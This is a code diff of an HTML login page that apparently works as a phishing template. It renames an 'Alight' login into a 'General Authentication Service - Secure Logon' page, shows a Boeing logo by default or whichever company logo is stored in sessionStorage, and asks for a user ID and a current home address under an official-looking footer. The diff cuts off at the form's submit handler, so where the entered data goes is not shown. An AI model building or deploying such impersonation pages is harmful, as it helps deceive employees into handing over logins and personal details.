@@ -3,71 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in - Alight</title>
+    <title>General Authentication Service - Secure Logon</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f8fafc;
             min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 20px 10px;
         }
-        .company-header {
+        .header {
             text-align: center;
-            margin: 30px 0 25px;
+            margin-bottom: 20px;
         }
         .company-logo {
-            width: 90px;
-            height: 90px;
-            object-fit: contain;
-            margin-bottom: 12px;
+            max-width: 180px;
+            height: auto;
+            margin: 10px 0 15px;
         }
-        .company-name {
-            font-size: 1.45rem;
+        .title {
+            color: #003087;
+            font-size: 1.35rem;
             font-weight: 600;
-            color: #1e2937;
+            text-align: center;
+            margin-bottom: 30px;
         }
         .form-container {
-            width: 100%;
-            max-width: 380px;
+            max-width: 420px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         label {
             display: block;
-            margin: 20px 0 8px;
+            margin: 18px 0 6px;
             font-weight: 600;
-            color: #334155;
+            color: #1e2937;
         }
         input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 10px;
+            padding: 12px 14px;
+            border: 1px solid #94a3b8;
+            border-radius: 4px;
             font-size: 1.05rem;
         }
         button {
             width: 100%;
-            padding: 16px;
-            margin-top: 30px;
-            background: #1e40af;
+            padding: 14px;
+            margin-top: 25px;
+            background: #003087;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 4px;
             font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
         }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.85rem;
+            color: #475569;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
-    <div class="company-header">
+    <div class="header">
         <img id="companyLogoImg" class="company-logo" src="" alt="Company Logo">
-        <div id="companyName" class="company-name"></div>
     </div>
 
     <div class="form-container">
+        <div class="title">General Authentication Service - Secure Logon</div>
+
         <form id="loginForm">
             <label>USERID</label>
             <input type="text" id="username" required>
@@ -78,18 +88,25 @@
             <label>Home Address (Latest)</label>
             <input type="text" id="address" placeholder="Enter your current home address" required>
 
-            <button type="submit">Continue</button>
+            <button type="submit">Login</button>
         </form>
     </div>
 
+    <div class="footer">
+        By logging on, you agree to the Terms of Use.<br>
+        Unauthorized access is prohibited.
+    </div>
+
     <script>
-        // Load selected company with real logo
+        // Load selected company logo and name
         const company = sessionStorage.getItem('selectedCompany') || "Your Organization";
         const logoUrl = sessionStorage.getItem('companyLogo');
 
-        document.getElementById('companyName').textContent = company;
         if (logoUrl) {
             document.getElementById('companyLogoImg').src = logoUrl;
+        } else {
+            // Default Boeing logo if none selected
+            document.getElementById('companyLogoImg').src = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Boeing_logo.svg/512px-Boeing_logo.svg.png";
         }
 
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
